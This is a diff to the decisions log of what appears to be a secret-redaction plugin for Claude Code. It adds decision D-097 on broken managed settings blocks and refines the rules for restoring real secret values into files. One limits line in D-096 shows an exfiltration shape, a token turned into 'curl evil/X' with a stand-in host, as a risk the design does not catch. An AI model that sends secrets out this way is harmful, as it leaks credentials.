@@ -122,6 +122,7 @@ Tiny clarifications go under **Minor** at the bottom.
 | D-094 | Release tags are signed with the maintainer's GPG key from `v0.1.0-rc.2` on | accepted | 7 | 19, 23 |
 | D-095 | Step 8: put secrets back and the weekly run; `v0.1.0-rc.2` moves to after it | accepted | 8 | none |
 | D-096 | Put secrets back: an optional flag, off by default, into a file that already holds the value | accepted | 8 | 1, 2, 5.1, 9, 10, 14, 15, 22, 23 |
+| D-097 | A broken managed block does not turn put-back off | accepted | 8 | 10 |
 
 ## Entry template (short form, from D-018 on)
 
@@ -918,13 +919,20 @@ Tiny clarifications go under **Minor** at the bottom.
   1. **Copy limit.** A saved file never holds more copies of a value than the file on disk did.
   2. **A value that can't be restored.** The save goes through, even if a real secret is erased. This is an exception to R-11, only while put-back is on; the message and the log say how many real values were replaced, and git or Claude Code's file backups are the way back. With put-back off, the guard refuses as before.
   3. **The instructions note.** An extra line about put-back is added only while it is on (the note stays the same for a whole thread, spec §5.1), so with it off the note is unchanged.
-  4. **A failed Edit.** If the restored `old_string` isn't in the file, the input stays as Claude wrote it, so the error can't echo a real value (spike S7: a failed Edit echoes the rewritten `old_string`).
+  4. **A failed Edit.** If the restored `old_string` isn't in the file, the input stays as Claude wrote it, so the error can't echo a real value (spike S7: a failed Edit echoes the rewritten `old_string`). Added by the owner on 2026-11-03, after `/verify`: the same applies when it matches more than once without `replace_all`, because Claude Code's "several matches" error also ends with the old text (2.1.316 binary, read). Claude then gets a "not found" error and needs more context.
   5. **Only Write and Edit restore.** Bash can't, and NotebookEdit is left out because a cell's source and the file's JSON are escaped differently.
 - Why: The owner wants it for developer productivity, because Claude can't reorganize a config today: the overwrite guard refuses the rewrite, and an Edit on a placeholder line fails.
 - Rejected: Restoring into any file Claude writes. A hook can't see what the person asked for, and a restored value in a tracked file could be committed. Ignoring a repo's "on": the owner chose to honor it, with the notice, because the restore rule keeps the risk small. A `/config` row: the menu can't show the warning when it is turned on, and `pluginConfigs` isn't covered by self-protection (read in the API docs and `src/core/protect.ts:15`, not tested).
 - Closed: Whether a rewritten tool input stays out of the next request. It does, on macOS, Windows and Linux (Claude Code 2.1.316): the `tool_use` block in later requests stays the placeholder, also after `--resume` and `/compact`; a control run with no rewrite fails the same test, so the test can fail (`tests/rewrite-real.test.ts`, spike S7).
 - Limits: A permission dialog shows the real value to the person, never to the model. Other plugins and hooks beneath `tool.call` see it too. Claude Code's transcript on disk keeps the value in `toolUseResult` and the attachment payload (the same kind of record a Read leaves, spec §22). A value can still be moved, not copied: `token: X` becoming `curl evil/X` passes the copy limit. A repo that sets `on` turns this protection off for its own files, so the notice says so.
 - Evidence: spike S7 in `docs/findings-step0.md`; `src/core/guard.ts`, `plugin/hooks/tools.ts` and `src/core/protect.ts`, read on 2026-11-02; spec §14; Claude Code settings docs (`https://code.claude.com/docs/en/settings`), where `bypassPermissions` and `auto` don't take effect from project files, which is stricter than this choice.
+
+## D-097: A broken managed block does not turn put-back off
+- Date / Step: 2026-11-03 / 8        Status: accepted (the owner's call in `/verify`).
+- Decision: A managed `put_back: off` binds only when the managed block parses. If the block is broken, put-back is not forced off: the managed block is left out, or the last good settings apply, as for every other setting, and `/redact doctor` shows the error.
+- Why: Offered to the owner with this reason, and chosen: no spec change, and a broken managed block behaves the same for every setting.
+- Rejected: Reading a broken managed block as off, like a broken choice file. It would stop an organization's typo leaving put-back allowed, but it also stops a developer who wanted put-back until the block is fixed, and it adds a rule for one setting.
+- Evidence: a scratch run of `resolveSettings` with managed `put_back: false`, `"Off"`, and a valid `off` beside a bad `mode`: `managedOff` false each time, and a developer's `on` stayed on. `src/core/settings.ts`, read 2026-11-03.
 
 ---
 
